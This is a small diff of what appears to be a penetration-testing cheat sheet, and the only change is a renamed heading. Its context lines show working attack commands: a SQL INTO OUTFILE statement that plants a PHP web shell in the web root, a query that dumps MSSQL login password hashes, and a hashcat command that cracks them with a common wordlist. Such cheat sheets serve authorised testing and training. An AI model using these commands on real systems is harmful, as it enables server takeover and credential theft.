@@ -46,7 +46,7 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 SELECT name, password_hash FROM sys.sql_logins;
 ```
 
-## Crack MSSQL hashes with hashcat
+## Hashcat MSSQL
 ```bash
 hashcat -m 1731 mssql_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
